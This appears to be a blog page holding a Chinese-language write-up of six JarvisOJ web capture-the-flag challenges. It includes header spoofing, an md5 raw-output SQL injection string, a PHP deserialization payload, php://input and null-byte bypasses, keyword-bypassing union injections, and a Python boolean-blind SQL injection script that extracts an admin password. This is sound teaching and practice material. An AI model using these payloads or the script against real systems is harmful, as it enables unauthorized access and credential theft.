@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>jarvisoj web 题目解答 | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1.PORT51题目要求使用51号端口访问该地址 curl --local-port 51 http:&#x2F;&#x2F;web.jarvisoj.com:32770&#x2F;  2.LOCALHOST题目提示只有localhost才能访问，故在请求头中添加： client-ip: 127.0.0.1 X-Forwarded-For: 127.0.0.1  成功获取到flag。 3.Loginburp抓取到响应头部隐藏提">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj web 题目解答">
+<meta property="og:url" content="https://rock718.github.io.git/2019/12/24/jarvisoj-web-wp/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="1.PORT51题目要求使用51号端口访问该地址 curl --local-port 51 http:&#x2F;&#x2F;web.jarvisoj.com:32770&#x2F;  2.LOCALHOST题目提示只有localhost才能访问，故在请求头中添加： client-ip: 127.0.0.1 X-Forwarded-For: 127.0.0.1  成功获取到flag。 3.Loginburp抓取到响应头部隐藏提">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-12-24T12:30:19.000Z">
+<meta property="article:modified_time" content="2020-05-26T13:14:10.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-jarvisoj-web-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      jarvisoj web 题目解答
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-PORT51"><a href="#1-PORT51" class="headerlink" title="1.PORT51"></a>1.PORT51</h2><p>题目要求使用51号端口访问该地址</p>
+<pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/
+</code></pre>
+<h2 id="2-LOCALHOST"><a href="#2-LOCALHOST" class="headerlink" title="2.LOCALHOST"></a>2.LOCALHOST</h2><p>题目提示只有localhost才能访问，故在请求头中添加：</p>
+<pre><code>client-ip: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+</code></pre>
+<p>成功获取到flag。</p>
+<h2 id="3-Login"><a href="#3-Login" class="headerlink" title="3.Login"></a>3.Login</h2><p>burp抓取到响应头部隐藏提示：</p>
+<pre><code>Hint: &quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;
+</code></pre>
+<p><code>md5($pass,true)</code>说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</p>
+<pre><code>明文: 129581926211651571912466741651878684928
+md5hex: 06da5430449f8f6f23dfc1276f722738
+对应的字符串: ?T0D??o#??’or’8.N=?
+明文: ffifdyop
+md5hex: 276f722736c95d99e921722cf9ed621c
+对应的字符串: ‘or’6蒥欓!r,b
+</code></pre>
+<p><em><strong>注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</strong></em></p>
+<h2 id="4-神盾局的秘密"><a href="#4-神盾局的秘密" class="headerlink" title="4.神盾局的秘密"></a>4.神盾局的秘密</h2><p>打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</p>
+<pre><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;
+</code></pre>
+<p>看到这里<code>img</code>后的base64编码字符串，解码后为<code>shield.jpg</code>。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。<br>包含<code>showimg.php</code>，查看源码显示：</p>
+<pre><code>&lt;?php
+    $f = $_GET[&#39;img&#39;];
+    if (!empty($f)) &#123;
+        $f = base64_decode($f);
+        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
+        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) &#123;
+            readfile($f);
+        &#125; else &#123;
+            echo &quot;File not found!&quot;;
+        &#125;
+    &#125;
+?&gt;
+</code></pre>
+<p>可以看到这里对<code>pctf</code>进行了过滤。<br>进一步尝试包含<code>index.php</code>：</p>
+<pre><code>&lt;?php
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    if (!empty($g)) &#123;
+        $x = unserialize($g);
+    &#125;
+    echo $x-&gt;readfile();
+?&gt;
+</code></pre>
+<p>再包含<code>shield.php</code>：</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield &#123;
+        public $file;
+        function __construct($filename = &#39;&#39;) &#123;
+            $this -&gt; file = $filename;
+        &#125;
+
+        function readfile() &#123;
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) &#123;
+                return @file_get_contents($this-&gt;file);
+            &#125;
+        &#125;
+    &#125;
+?&gt;
+</code></pre>
+<p>由于<code>showimg.php</code>对<code>pctf</code>进行了过滤，所以我们不能简单地直接包含<code>pctf.php</code>,但是可以注意到<code>index.php</code>允许我们提交一个<code>class</code>参数，该参数可以被反序列化为<code>Shield()</code>对象，然后调用其<code>readfile()</code>方法。故我们需要做的是为<code>class</code>参数传入一个序列化后的<code>Shield()</code>对象，这样经过反序列化后再调用其<code>readfile()</code>方法，就可以正确读取<code>pctf.php</code>。<br>我们可以在本地搭建一个php环境，结合<code>shield.php</code>，输出序列化后的<code>Shield()</code>对象：</p>
+<pre><code>&lt;?php
+    class Shield &#123;
+        public $file;
+        function __construct($filename = &#39;&#39;) &#123;
+            $this -&gt; file = $filename;
+        &#125;
+
+        function readfile() &#123;
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) &#123;
+                return @file_get_contents($this-&gt;file);
+            &#125;
+        &#125;
+&#125;
+$pctf = new Shield(&quot;pctf.php&quot;);
+echo serialize($pctf);
+?&gt;
+</code></pre>
+<p>运行的结果为：</p>
+<pre><code>O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;
+</code></pre>
+<p>将该结果填入URL：</p>
+<pre><code>/index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;
+</code></pre>
+<p>得到flag。</p>
+<h2 id="5-IN-A-Mess"><a href="#5-IN-A-Mess" class="headerlink" title="5.IN A Mess"></a>5.IN A Mess</h2><p>访问题目链接，查看源码，发现<code>index.phps</code>,访问。发现里面有php源码，尝试进行分析：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+echo &quot;&lt;!--index.phps--&gt;&quot;;
+
+if(!$_GET[&#39;id&#39;])
+&#123;
+    header(&#39;Location: index.php?id=1&#39;);
+    exit();
+&#125;
+$id=$_GET[&#39;id&#39;];
+$a=$_GET[&#39;a&#39;];
+$b=$_GET[&#39;b&#39;];
+if(stripos($a,&#39;.&#39;))
+&#123;
+    echo &#39;Hahahahahaha&#39;;
+    return ;
+&#125;
+$data = @file_get_contents($a,&#39;r&#39;);
+if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+&#123;
+    require(&quot;flag.txt&quot;);
+&#125;
+else
+&#123;
+    print &quot;work harder!harder!harder!&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>程序接收了<code>id</code>、<code>a</code>、<code>b</code>三个参数。</p>
+<ul>
+<li><p><code>id</code>不为<code>0</code>且<code>id</code>和<code>0</code>比较后相等;</p>
+</li>
+<li><p><code>a</code>用来指定打开的文件名，并要求文件内容为<code>1112 is a nice lab!</code>;</p>
+</li>
+<li><p><code>b</code>的长度要大于5,且和<code>111</code>拼接后可以匹配<code>1114</code>,且<code>b</code>的第一个字符和<code>4</code>不相等;<br><code>id</code>可以利用php的弱类型比较来绕过。<code>a</code>可以使用<code>php:\\input</code>或<code>data:</code>伪协议来绕过。由于<code>eregi()</code>受<code>\x00</code>截断影响，所以<code>b</code>可以通过<code>\x00</code>截断绕过。<br>故可构造URL：</p>
+<p>  &#x2F;index.php?id&#x3D;0e&amp;a&#x3D;php:&#x2F;&#x2F;input&amp;b&#x3D;%0044444</p>
+</li>
+</ul>
+<p>数据部分添加：</p>
+<pre><code>1112 is a nice lab!
+</code></pre>
+<p>页面返回以下字符串：</p>
+<pre><code>&lt;!--index.phps--&gt; Come ON!!! &#123;/^HT2mCpcvOLf&#125;
+</code></pre>
+<p><code>/^HT2mCpcvOLf</code>像是一个目录，故尝试访问，经过一系列跳转后到达以下页面：</p>
+<pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1
+</code></pre>
+<p>看不出有其他异常点，由于含有参数<code>?id=1</code>，故尝试sql注入。发现输入<code>&#39;</code>时回显查询字符串，表名为<code>content</code>，确认考察sql注入。</p>
+<p>1.判断注入类型为数字型注入</p>
+<p>2.查明过滤字符和关键字，经过测试，发现过滤了<code>select</code>、<code>union</code>、<code>from</code>、<code>空格</code>，关键字使用双写、大小写绕过，<code>空格</code>使用&#x2F;<em>1</em>&#x2F;绕过。</p>
+<p>3.通过union查询来获得<code>content</code>表的列名：</p>
+<pre><code>?id=-1/*1*/uunionnIon/*1*/seunionleCT/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74%23
+</code></pre>
+<p><em><strong>这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。</strong></em></p>
+<p>查询结果为：</p>
+<pre><code>id,context,title
+</code></pre>
+<p>对<code>context</code>列进行查找：</p>
+<pre><code>?id=-1/*1*/uunionnIon/*1*/seunionleCT/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content%23
+</code></pre>
+<p>查询结果即为flag。</p>
+<h2 id="6-Simple-Injection"><a href="#6-Simple-Injection" class="headerlink" title="6.Simple Injection"></a>6.Simple Injection</h2><p>首先对网站进行目录扫描，未发现其他有价值的页面。着手对登录页面进行注入。</p>
+<p>发现页面会提示用户名错误和密码错误，判断用户名和密码验证为分步进行。</p>
+<p>测试常用用户名，发现合法用户名<code>admin</code>。</p>
+<p>对该用户名进行注入，发现为字符型注入，且闭合符号为<code>&#39;</code>，<code>&#39;||1#</code>可顺利绕过用户名验证。</p>
+<p>对此位置进行基于bool的盲注。</p>
+<pre><code>#!/usr/bin/python3
+# -- coding: utf-8 --
+
+import requests
+import urllib.parse
+
+URL = &quot;http://web.jarvisoj.com:32787/login.php&quot;
+
+# Fuzz
+fObj = open(&quot;/root/Desktop/special_char.txt&quot;, &#39;r&#39;)
+
+for word in fObj.readlines():
+    word_ = word.strip()
+    word = urllib.parse.unquote(word_)
+    parma = &#123;&quot;username&quot;:&quot;&#39;||length(&#39;\\&quot;+ word +&quot;&#39;)=&quot;+ str(len(word)) +&quot;#&quot;, &quot;password&quot;:&quot;1&quot;&#125;
+    post = requests.post(url=URL, data=parma)
+    if post.text.find(&quot;密码错误&quot;) == -1:
+        print(&quot;%s\tFiltered&quot; % word_)
+
+fObj.close()
+
+fObj = open(&quot;/root/Desktop/char_list.txt&quot;, &#39;r&#39;)
+chrList = fObj.readlines()
+fObj.close()
+
+# query = &quot;(database())&quot;
+# query = &quot;(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1)&quot;
+# query = &quot;(select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;admin&#39;/**/limit/**/2,1)&quot;
+# id	username	password
+query = &quot;(select/**/password/**/from/**/admin)&quot;
+
+length = 0
+for l in range(1,100):
+    parma = &#123;&quot;username&quot;:&quot;&#39;||length(&quot;+ query +&quot;)=&quot;+ str(l) +&quot;#&quot;, &quot;password&quot;:&quot;1&quot;&#125;
+    post = requests.post(url=URL, data=parma)
+    if post.text.find(&quot;密码错误&quot;) != -1:
+        length = l
+        break
+print(length)
+
+for l in range(length):
+    flag = False
+    for ch in chrList:
+        ch = ch.strip()
+        parma = &#123;&quot;username&quot;:&quot;&#39;||substr(&quot;+ query +&quot;,&quot;+ str(l+1) +&quot;,1)=&#39;&quot;+ ch +&quot;&#39;#&quot;, &quot;password&quot;:&quot;1&quot;&#125;
+        post = requests.post(url=URL, data=parma)
+        if post.text.find(&quot;密码错误&quot;) != -1:
+            print(ch, end=&#39;&#39;)
+            flag = True
+            break
+    if not flag:
+        print(&quot;*&quot;, end=&#39;&#39;)
+print()
+</code></pre>
+<p><em><strong>心得：要先对注入点进行测试，判断过滤了哪些特殊字符和关键字，注意对特殊字符进行转义。</strong></em></p>
+<h2 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2019/12/24/jarvisoj-web-wp/" data-id="cl9y4cx9k001s24fye6a37ccz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/12/30/xctf-web-wp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          xctf-web-wp
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/12/21/CG-CTF-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">CG-CTF_解题思路</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
